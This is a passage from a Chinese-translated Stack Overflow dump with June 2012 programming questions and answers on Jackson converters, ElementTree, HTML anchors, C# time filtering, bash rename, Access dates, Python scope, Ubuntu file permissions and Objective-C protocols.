我使用[@JsonFilter](http://fasterxml.github.com/jackson-annotations/javadoc/2.0.5/)有选择地过滤掉同一对象上的属性，当时 Spring 不（并且仍然不？）支持这个，所以我注册了一个自定义 MappingJackson2HttpMessageConverter 来检查返回类型，如果它是一个过滤器包装类型，我取出过滤器并应用它。

```
public class JsonFilterAwareMappingJackson2HttpMessageConverter extends
    MappingJackson2HttpMessageConverter {

private boolean prefixJson = false;

@Override
public void setPrefixJson(boolean prefixJson) {
    this.prefixJson = prefixJson;
    super.setPrefixJson(prefixJson);
}

@Override
protected Object readInternal(Class<?> clazz, HttpInputMessage inputMessage)
        throws IOException, HttpMessageNotReadableException {

    JavaType javaType = getJavaType(clazz);
    try {
        return this.getObjectMapper().readValue(inputMessage.getBody(), javaType);
    }
    catch (IOException ex) {
        logger.error("Could not read JSON: " + ex.getMessage());
        throw new HttpMessageNotReadableException("Could not read JSON: " + ex.getMessage(), ex);
    }

}

@Override
protected void writeInternal(Object object, HttpOutputMessage outputMessage)
        throws IOException, HttpMessageNotWritableException {
    JsonEncoding encoding = getJsonEncoding(outputMessage.getHeaders().getContentType());
    ObjectMapper objectMapper = getObjectMapper();
    JsonGenerator jsonGenerator =
            objectMapper.getJsonFactory().createJsonGenerator(outputMessage.getBody(), encoding);

    // A workaround for JsonGenerators not applying serialization features
    // https://github.com/FasterXML/jackson-databind/issues/12
    if (objectMapper.isEnabled(SerializationFeature.INDENT_OUTPUT)) {
        jsonGenerator.useDefaultPrettyPrinter();
    }

    try {
        if (this.prefixJson) {
            jsonGenerator.writeRaw("{} && ");
        }

        objectMapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);
        if (object instanceof FilterAppliedJsonObject) {
            FilterAppliedJsonObject viewObject = FilterAppliedJsonObject.class.cast(object);
            objectMapper.setFilters(viewObject.getFilters());
            objectMapper.writeValue(jsonGenerator, viewObject.getObject()); 
        } else if (object == null) {
            jsonGenerator.writeNull();

        } else {
            objectMapper.writeValue(jsonGenerator, object); 
        }
    }
    catch (JsonProcessingException ex) {
        logger.error("Could not write JSON: " + ex.getMessage());
        throw new HttpMessageNotWritableException("Could not write JSON: " + ex.getMessage(), ex);
    }
}

} 
```

我尽可能多地使用 java @config 而不是 xml 配置，所以我这样做：

```
@Override
public void configureMessageConverters(
        List<HttpMessageConverter<?>> converters) {
    converters.add(new JsonFilterAwareMappingJackson2HttpMessageConverter());
    super.configureMessageConverters(converters);
} 
```

如果您想在 xml 中注册这种转换，我认为[这篇文章会对您有所帮助](https://stackoverflow.com/questions/5019162/custom-httpmessageconverter-with-responsebody-to-do-json-things)

# python - 如何使用 ElementTree 从标签中提取文本

> ID：11091749
> 
> 赞同：0
> 
> 时间：2012-06-18T22:02:14.700
> 
> 标签：python, xml, elementtree

我有以下 XML 文件：

```
<class id="1" name="good/bad">
    <verb>
        <token>like</token>
        <token>feel</token>
    </verb>
    <mess>This is <sugg>not</sugg> text</mess>
    <id type="incorrect">I'm glad to <marker>unsee you</marker>.</id>
    <id type="correct">I'm glad to see you.</id>
</class> 
```

我需要从特定标签中提取文本。在[http://effbot.org](http://effbot.org)上的示例很少，而且文档通常很差。也许其他地方有很好的例子？以及如何将相同标签（令牌）中的文本作为单独的实体处理？提前致谢！结果应该大致如下：

```
(like) feel > not #This is not text 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:51:01.180

我不清楚您希望对`<mess>`元素的内容做什么。
对于`<verb>`元素的孩子，试试这个：

```
import xml.etree.ElementTree as ET
the_tree = ET.fromstring('''<class id="1" name="good/bad">
    <verb>
        <token>like</token>
        <token>feel</token>
    </verb>
    <mess>This is <sugg>not</sugg> text</mess>
    <id type="incorrect">I'm glad to <marker>unsee you</marker>.</id>
    <id type="correct">I'm glad to see you.</id>
</class>''')
elems = the_tree.find('./verb').getchildren()
verbs = [verb.text for verb in elems]
# -> ['like', 'feel'] 
```

* * *

如果您的文件较大，也许您更喜欢这种访问元素的替代方式：

```
tree, id_map = ET.XMLID('''<class id="1" name="good/bad">
    <verb>
        <token>like</token>
        <token>feel</token>
    </verb>
    <mess>This is <sugg>not</sugg> text</mess>
    <id type="incorrect">I'm glad to <marker>unsee you</marker>.</id>
    <id type="correct">I'm glad to see you.</id>
</class>''')
elems = id_map['1'].find('verb')
verbs = [verb.text for verb in elems] 
```

# html - 单击href链接时div不滚动

> ID：11091753
> 
> 赞同：0
> 
> 时间：2012-06-18T22:02:37.623
> 
> 标签：html, anchor, hyperlink

我有一个网站，里面有一堆图片，你可以水平滚动，我也有缩略图，我希望能够点击它们滚动到所需的图片。我已经阅读了有关使用锚滚动到 id 的所有内容，但是我仍然无法使其正常工作。如果有人可以帮助我，我将附上我的代码，那将是惊人的。

谢谢

```
 <!--Start Main Content-->
<div style="width:1100px; overflow-x:scroll; overflow-y:hidden;">
    <div style="width:6716px; height:600px; ">
        <!--<a id="section_1"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait05_lg.jpg'); width:465px; height:700px;">
                <div class="more" id="couch">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>-->

        <a id="section_2"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait06_lg.jpg'); width:700px; height:465px;">
                <div class="more" id="couch2">
                    <img src="images/more.png" width="25" height="25" />
                    <span><img src="../images/blog.png"></span>
                </div>

                <div class="more" id="plant2">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor2">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_3"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait07_lg.jpg'); width:700px; height:498px;">
                <div class="more" id="couch3">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant3">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor3">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_4"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait04_lg.jpg'); width:416px; height:643px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_5"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait01_lg.jpg'); width:700px; height:517px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_6"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait02_lg.jpg'); width:700px; height:465px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_7"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait03_lg.jpg'); width:700px; height:527px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_8"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait08_lg.jpg'); width:700px; height:465px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_9"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/Portrait09_lg.jpg'); width:700px; height:399px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_10"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/fashion01_lg.jpg'); width:700px; height:465px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <a id="section_11"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/fashion02_lg.jpg'); width:700px; height:481px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>

        <!--<a id="section_12"></a>
            <div id="picture" style="background-image:url('../images/Photography/Fashion/fashion03_lg.jpg'); width:700px; height:879px;">
                <div class="more" id="couch4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="plant4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>

                <div class="more" id="monitor4">
                    <img src="images/more.png" />
                    <span>Test</span>
                </div>
            </div>
        -->

    </div>

</div>

<div id="index-text">
    <div class="shadowTop"></div>

    <div id="text" style="width:900px;">
    <a href="#section_1"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_2"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_3"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_4"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_5"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_6"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_7"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_8"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_9"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_10"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_11"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a>
    <a href="#section_12"><img src="../images/Photography/Fashion/Portrait06_lg.jpg" width="50" height="50" border="0" /></a><br><br> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:39:08.867

尝试在标签中使用 name 属性而不是 id。

```
<a name="section_11"></a> 
```

# php - 类属性的文档块被忽略

> ID：11091755
> 
> 赞同：0
> 
> 时间：2012-06-18T22:02:46.060
> 
> 标签：php, phpdoc

我一直在使用`@var`标签记录类属性，但是当我运行 phpdoc 来生成文档时它会抱怨`No DocBlock was found for property $someProperty`。

例如：

```
class MyClass {
   /**
    * Some property that should be documented
    *
    * @var mixed $someProperty
    */
   protected $someProperty; 

   .
   .
   .

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T23:11:05.340

原来，phpdoc 安装在某种程度上被破坏了。卸载然后安装干净修复了错误。

# c# - 获取特定时间段的数据

> ID：11091759
> 
> 赞同：0
> 
> 时间：2012-06-18T22:03:12.070
> 
> 标签：c#, asp.net, database, datetime

我有一个 aspx 文档，它以 HTML 表的形式返回来自数据库的传入航班列表。它显示当天的所有航班。生成行的部分是：

```
 string fechha = dias + "/" + mess + "/" + años;
    string fecVuel = fechha;

    for (int i = 0; i <= num - 1; i++)
    {
        string hora = xl.ChildNodes[0].ChildNodes[i].ChildNodes[5].InnerText;
        fecVuel = xl.ChildNodes[0].ChildNodes[i].ChildNodes[0].InnerText;
        if (fecVuel == fechha)
        {
            fila = new TableRow(); 
```

我想要的是让它只获得与*特定时间段*匹配的航班，例如当前时间前后 2 小时。在代码中， 的值`string hora`是从数据库中检索到的飞行时间。

我尝试添加当前时间变量`rightnow = DateTime.Now.Hour;`并添加条件，如下所示：

```
if (fecVuel == fecha && ((hora >= rightnow - 2) || (hora <= rightnow + 2))) {... 
```

但它仍在生成整个表格。我什至尝试将其更改为，`fecVuel != fecha`但它没有任何改变：S 我对 asp 不太擅长，我正在使用 Notepad++ 进行编辑。有任何想法吗？谢谢你的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:09:10.243

假设现在是 14:00

两小时前是12:00。再过两个小时就是16:00。

现在 (14:00) 将始终满足以下两个条件之一：

大于 12:00 或小于 16:00。

如果将 OR 更改为 AND，则必须同时满足这两个条件。

```
if (fecVuel == fecha && ((hora >= rightnow - 2) && (hora <= rightnow + 2))) 
```

如果使用 AND，则仅选择 14:00 到 16:00（不包括这些时间）之间的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:18:05.360

表中的所有内容都将与您的陈述相匹配，因为这说明了什么： `if (fecVuel == fecha && (( rightnow - 2 <= hora ) || (hora <= rightnow + 2))) {...`

它说任何东西`(rightnow - 2 <= hora) OR (hora <= rightnow + 2)`--- 无论是在您的目标时间前 18 小时还是在您的目标时间后 99 小时，一切都将等于其中一个或另一个。

你需要的是：`((rightnow - 2) <= hora) && (hora <= (rightnow + 2))`

所以，将你的更改`||`为`&&`，你应该得到你想要的结果。

# objective-c - 如何在 iOS 分组 UITableView 中获取 Rectangle UITableViewCells

> ID：11091761
> 
> 赞同：0
> 
> 时间：2012-06-18T22:03:28.117
> 
> 标签：objective-c, ios, xcode

我有一个 UITableView 样式：“分组”

默认情况下，iOS 给我圆形单元格，白色背景和灰色分隔符。

如何配置表格，以便仅对于单元格的一部分，单元格是矩形（无边框半径）并且没有分隔符？- 我希望在这些单元格上使用自定义背景图像。

提前致谢 -

博

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:26:42.530

您可以通过为第一个和最后一个单元格创建一个虚拟单元格并将`tableView:heightForRowAtIndexPath:`.

您可以在情节提要的检查器部分将分隔符设置为 None 和 clearColor 以消除分隔符。

然后，您可以使用`backgroundView`以下单元格创建自定义背景图像`cellForRowAtIndexPath:`：

```
UIImageView *customImage = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"yourimage.png"];
[theCell setBackgroundView:customImage]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:15:36.093

您可以使用表格中的两种`UITableViewCell`，原始用于标准单元格和自定义子类，并覆盖`drawRect`以绘制其他单元格，具体取决于`indexPath`.

# bash - 如何将重命名命令的结果分配给变量？

> ID：11091763
> 
> 赞同：0
> 
> 时间：2012-06-18T22:03:33.093
> 
> 标签：bash, ubuntu, rename

我正在尝试将命令的输出设置为脚本中的变量。我已经搜索了一整天，看起来我有正确的命令。但每次我运行我的脚本时，它只是运行命令而不是只将它分配给一个变量而不运行它。

这是脚本的相关部分：

```
ffname=$(rename 's/_1080p_12000//' *.*)
echo $ffname 
```

我需要在脚本的另一部分使用 ffname 作为变量而不运行命令.. 但它似乎不想工作。有人有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:26:04.153

您可以添加`-n`(no-act) 选项`rename`来获取输出。

```
ffnames=($(rename -n 's/_1080p_12000//' *.* | awk '{print $1,$NF}')) 
```

结果包含多个项目。所以你需要一个数组来保存它们。

然后在没有`-n`选项的情况下进行真正的重命名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-24T15:46:31.607

如果您使用的是 Bash，则可以在填充的变量上使用[shell 参数扩展](http://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion)替换运算符来替换要删除的文件名部分。例如：

```
$ ffname=foo_1080p_12000.bar
$ echo "${ffname/_1080p_12000}"
foo.bar 
```

但是，执行实际的 mv 或 rename 命令，或者根据需要将修改后的值重新分配回*ffname 将由*您自己决定。

# sql - vb 和 mdb 的日期时间问题

> ID：11091764
> 
> 赞同：0
> 
> 时间：2012-06-18T22:03:39.073
> 
> 标签：sql, ms-access, datetime

我正在开发一个使用 .mdb 数据库的旧软件。

我已经成功地建立了与数据库的连接，当涉及到像这样的预编程查询时，我可以很好地运行 sql 查询：

`SELECT COUNT(*) AS test FROM shifts WHERE EmpId = '2' AND DateOpen <= '3/28/2007'`

继续前进，我将 2 替换为取决于用户选择的表达式，如下所示

`Employees(employe.SelectedIndex)`

这也很好。

现在，当我尝试将日期替换为`startDate.Value.ToShortDateString`我开始面临许多转换问题时，我终于有了一些有用的东西，所以我的 where 子句变成了这样：

`WHERE EmpId = '" & Employees(employe.SelectedIndex) & "' AND DateDiff('d', DateOpen, '" & endDate.Value.ToShortDateString & "') <= 0`

现在我选择了上面查询中的相同日期，查询运行没有问题，但令人惊讶的是我得到了一个空结果，这对我来说没有任何意义，因为已经存在值的查询返回的计数为 2。

我使用了一些调试输出来确保正确生成了查询，并且在选择日期时得到了与上面相同的查询。

如果您知道为什么这不起作用或对正确的方法有任何提示，我将不胜感激您的所有意见。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T10:51:52.900

我建议您在处理 MS Access 和 VBA 中的日期时避免使用格式化字符串。

提示：VBA 和 MS Access 将日期存储为双精度值，整数部分表示日期（自 1900 年 1 月 1 日起的天数），小数部分表示时间（天的小数部分）。EG：2012 年 6 月 20 日 05:57 存储为号码 41080.2408。

您可以使用双精度值来比较日期，就像比较任何一对数字一样，而不是使用格式化的字符串。如果值存储在“日期/时间”类型的字段中，您可以使用`CDbl()`将日期转换为双精度值，然后将其与另一个双精度值进行比较。

这对我有用。希望这对您有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-23T00:10:07.507

我最终在查询中使用了 BETWEEN，并且使用参数查询就像一个魅力！

```
WHERE (DateOpen BETWEEN @DStart AND @DEnd) 
```

# function - 从该类中调用函数 - php

> ID：11091765
> 
> 赞同：0
> 
> 时间：2012-06-18T22:03:45.913
> 
> 标签：function, cakephp

我在类 ceff() 中有一个名为 wsGO() 的函数。我希望能够从 ceff 类中运行该函数。我使用了这段代码：

```
class ceff{

    $ceff_instance = new ceff($this);
    $ceff_instance = wsGO();

    public function wsGO(){
        ....
    }
} 
```

然而这并没有奏效。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:11:08.977

在 PHP 中，您只能使用常量初始化属性 - 而不是函数或构造函数调用。您可以在构造函数中执行此操作，例如：

```
class ceff{

   public $ceff_instance;

   public function __construct() {
      $this->ceff_instance = $this->wsGO();
   }

   public function wsGO(){
      ....
   }
} 
```

# c# - 全屏 c# windows 窗体覆盖所有显示器

> ID：11091770
> 
> 赞同：1
> 
> 时间：2012-06-18T22:04:03.230
> 
> 标签：c#, winforms, fullscreen

有没有办法让 Windows 窗体应用程序全屏显示并关闭辅助监视器？所以主显示器在你的主显示器上，而你所有的其他显示器都是全黑的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:12:38.727

您可以使用 Screen 类，它为您提供有关当前活动屏幕的信息。

```
// Form myFrm
Rectangle r = new Rectangle();
foreach (Screen s in Screen.AllScreens)
{
   if ( s != Screen.CurrentScreen ) // Blackout only the secondary screens
         r = Rectangle.Union(r, s.Bounds);
}
myFrm.Top = r.Top;
myFrm.Left = r.Left;
myFrm.Width = r.Width;
myFrm.Height = r.Height;
myFrm.TopMost = true; // This will bring your window in front of all other windows including the taskbar 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:15:13.940

我可以想到一种方法，那就是找出计算机上有多少个显示器，以及它们相对于彼此的布局，然后在 0,0 创建主窗口，将其最大化并将其设置为 TopMost，然后对其他显示器执行相同的操作，将它们放置在与计算机每个显示器的左上角相对应的屏幕位置。

我能想到的唯一能在 WinForms 环境中从中受益的是一个旨在提供测试的应用程序；该应用程序将覆盖整个桌面（任务栏除外；您必须禁用“开始”菜单），并且几乎可以确保用户除了测试程序之外什么都看不到。它将为您提供最小的性能优势。

大部分黑屏的app除了主屏外，基本上都是用DirectX直接控制屏幕（通过显卡的底层接口）。如果您使用 WinForms 来制作您的程序，那么您的抽象级别比使用 DirectX 高出大约 50 级。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-02T13:56:02.337

一种方法是在您的应用程序中创建第二个表单。一个，当给定一组尺寸时，将打开没有边框或菜单，并且背景设置为黑色。

当你的应用程序运行时，枚举你的监视器（数一下看看有多少）并找到它们的尺寸。你的主要从 0,0 开始。然后为您的每个监视器（除了您的主要监视器）生成第二个表单的副本，并为该表单提供监视器的尺寸。然后他们会将每个屏幕变黑。

您需要记住保留每个表单的句柄，并在终止主表单时终止它们。

# python - 为什么这个变量不可见？

> ID：11091779
> 
> 赞同：0
> 
> 时间：2012-06-18T22:04:32.033
> 
> 标签：python, scope

好的，我是从 Perl 转向 Python 的，而且我在 Python 方面没有太多经验，所以这对于所有对 Python 更有经验的人来说似乎相当明显。

无论如何，我只是加载一个配置文件，然后作为自检打印加载的值。代码如下：

```
#!/home/y/bin/python2.7
import logging
import sys
import datetime
import yaml

def main(self):
    #initialize the logger
    logger = logging.getLogger(self.granularity)
    log_fh = logging.FileHandler(filename='/home/logs/pipelineTest/pipelineTest' + datetime.datetime.now().strftime('%Y%m%d_%H%M')  + '.log', mode='w')
    logger.addHandler(log_fh)
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)-6s: %(name)s - %(levelname)s - %(message)s')
    log_fh.setFormatter(formatter)

    #read configuration file
    if sys.argv[1]:
        ymlFH = open(sys.argv[1])
    else:
        ymFH = open('/home/conf/pipelineTest/runPipeline.yml')

    confDict = yaml.load(ymlFH)

if __name__ == '__main__':
    #self-test code
    for key, value in confDict.iteritems():
      print 'Key is: ' + key + '\n'
      print 'value is: ' + confDict[key] + '\n' 
```

我遇到的错误是：

```
Traceback (most recent call last):
  File "./runPipeline.py", line 30, in <module>
    for key, value in confDict.iteritems():
NameError: name 'confDict' is not defined 
```

我将其解释为名称“confDict”已超出范围。我不明白为什么它超出了范围。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T22:05:56.930

你的`main()`函数有它自己的范围——不仅如此，而且你永远不会调用它。

我建议你`confDict`从你的函数返回，然后`confDict = main()`在你的运行块中执行 - 或者，如果你不打算`main()`在多个地方使用你的函数，直接把它放下，不要打扰这个函数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-18T22:05:59.353

该变量`confDict`是在函数内部定义的`main()`，因此它是该函数的本地变量。（顺便说一句，你甚至不打电话`main()`。）

您可能希望将 for 循环从脚本末尾移动到`main()`函数末尾，并`main()`在脚本末尾调用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:08:09.960

confDict 对 main 来说是本地的，并且在 python 中，函数定义依赖于缩进。因此，当您尝试在 if 语句中访问它时，函数范围就结束了，因为 main 已经结束。（见缩进）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-19T01:38:38.613

不是`confDict`超出范围，而是从未**进入**范围。

```
import ...

def main(self):
    ...

if __name__ == '__main__':
    #self-test code
    for key, value in confDict.iteritems():
      print 'Key is: ' + key + '\n'
      print 'value is: ' + confDict[key] + '\n' 
```

此时`if __name__ == ...`，您已经导入了一堆名称，并定义了一个名为`main`. 该变量`condDict`从未被定义。我不知道任何可以定义类似代码的语言`condDict`，无论填充的是`...`什么`main`。

如果**调用** `main`，它会创建一个名为`confDict`. 但是，该名称将是特定调用的本地名称`main`，因此您不能在函数外部有意义地使用它（想象一下，您可以；`main`可以多次调用，并产生多个 ; 的值，当您引用外部`confDict`时，这意味着？）。`confDict``main`

我建议您阅读一些 Python 教程。如果您已经对一般编程（即 Perl）很熟悉，那么您将彻底了解它们，但它们会阐明所有这些基本的基础问题，以便您可以专注于编码。

* * *

顺便说一句，作为没有意义`self`的论点。`main`删除它并拥有`def main():`或使用而不是将它们从内部`def main(args)`拉出来（我更喜欢后者）。`sys.argv``main`

# php - Ubuntu CHOWN，以 FTP 用户身份上传，然后 www-data 无法移动文件？

> ID：11091780
> 
> 赞同：2
> 
> 时间：2012-06-18T22:04:54.670
> 
> 标签：php, ubuntu, rename, vps

我在运行 PHP 5.3 的 Ubuntu VPS 服务器上设置的站点存在问题。

我有 2 个在 PHP 中调用的目录：

```
/var/www/v-hosts/..../main/images/listing
/var/www/v-hosts/..../main/xml_sync/files 
```

第二个文件夹是使用 FTP 的程序上传图像的文件夹。一个脚本使用 www-data 用户将这些文件移动到顶层目录，这个脚本只是通过 cronjob 在浏览器中运行。

但是，我面临的问题是，如果我将第二个文件夹所有者设置为 FTP 用户名，则 www-data 用户在脚本运行时无法在 PHP 中移动这些文件夹......所以我必须`chown`为它做另一个。 ..

任何方式我都可以设置它，以便 www-data 和我的 ftp 用户都可以上传文件并且我的 www-data php 脚本可以移动文件而不会出错？

UBUNTU CMD - 当希望 FTP 允许上传到文件夹时....

```
 sudo chown -R myusername:www-data files 
```

UBUNTU CMD - 当希望 www-data 能够访问新上传的文件时......

```
 sudo chown -R myusername:www-data files 
```

PHP重命名代码：

```
 rename($_SERVER['DOCUMENT_ROOT'].$file1,$_SERVER['DOCUMENT_ROOT'].$file2); 
```

非常欢迎任何想法/修复。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:10:33.147

您可以简单地将 ftp 用户添加到 www-data 组：

```
sudo usermod -a -G ftp www-data 
```

# user-interface - 现代网站多平台截图

> ID：11091781
> 
> 赞同：0
> 
> 时间：2012-06-18T22:05:02.663
> 
> 标签：user-interface, photoshop, fireworks

是否有任何软件或psd模板可以制作多平台（iphone、ipad、浏览器...）网站截图，如下所示：

[http://vendhq.com/images/splash_image.jpg](http://vendhq.com/images/splash_image.jpg)

[http://vendhq.com/images/tour/pos_ipad.jpg](http://vendhq.com/images/tour/pos_ipad.jpg)

我正在寻找能够为您提供所有阴影效果、iphone/ipad 框架等 OOTB 的东西，而不仅仅是像 Snagit 这样的传统屏幕捕获应用程序

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-22T17:31:27.250

您应该尝试 PlaceIt 在更多“现实生活”环境中添加您的设计。只需选择一个场景并将您的设计放在上面即可。

[http://placeit.breezi.com](http://placeit.breezi.com)

这种魔法总是让客户高兴！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:07:57.803

您可以使用浏览器截图：

[http://browsershots.org/](http://browsershots.org/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-01T04:19:53.887

你也可以使用这个。[http://ami.responsivedesign.is/](http://ami.responsivedesign.is/)我使用 Firebug 将背景颜色更改为我需要的颜色。

# iphone - 在objective-c中转发声明一个协议

> ID：11091786
> 
> 赞同：2
> 
> 时间：2012-06-18T22:05:25.620
> 
> 标签：iphone, objective-c

我的班级 .h 看起来像：

```
@protocol AppInfoDelegate;
@class InfoTextView;

@interface AppInfoViewController : UIViewController <AppInfoDelegate> {

}

@property (nonatomic, retain) NSArray *textObjectsArray;
@property (nonatomic, retain) InfoTextView *itView;
@property (nonatomic, retain) UIButton *pgBackButton;
@property (nonatomic, retain) UIButton *pgFwdButton;

@end

@protocol AppInfoDelegate <NSObject>
- (void)closeButtonPressed:(id)sender;

@end 
```

我收到一条警告，提示找不到 AppInfoDelegate 的协议定义。执行此操作的正确方法是什么，为什么找不到？我需要在接口之前有协议的完整定义吗？谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-06-18T22:17:13.310

`@protocol MyProtocol;`例如，当您断言方法将`id <MyProtocol>`作为参数时，使用很有用。

当您声称您的类*符合*`<MyProtocol>`. 这样做的原因是编译器需要完整的协议声明，以验证您的类*实际上*符合协议。（这种编译时检查是使用正式协议而不是旧的非正式协议的一个重要原因。）

您可以通过两种方式进行修复。正如@skram 所建议的那样，一个是向前声明整个事情。这可行，但在我看来它也相当有限。在这种情况下，为什么要使用协议 - 只需将所有内容都放在课堂`@interface`上并完成它。

我更喜欢的第二种方法是实际上有一个单独的标题，例如`MyProtocol.h`. 然后，您可以根据需要自由地将其导入任何头文件或实现文件。这使您可以轻松地重用协议（并避免有时出现的循环导入问题）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:11:22.133

试试这个：

```
@protocol AppInfoDelegate <NSObject>
- (void)closeButtonPressed:(id)sender;

@end   

@class InfoTextView;

@interface AppInfoViewController : UIViewController <AppInfoDelegate> {

}

@property (nonatomic, retain) NSArray *textObjectsArray;
@property (nonatomic, retain) InfoTextView *itView;
@property (nonatomic, retain) UIButton *pgBackButton;
@property (nonatomic, retain) UIButton *pgFwdButton;

@end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:16:01.830

是的，超类和采用的协议定义需要在类定义之前定义（逐字或使用#import）。它们不能被提前声明。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-18T22:09:02.360

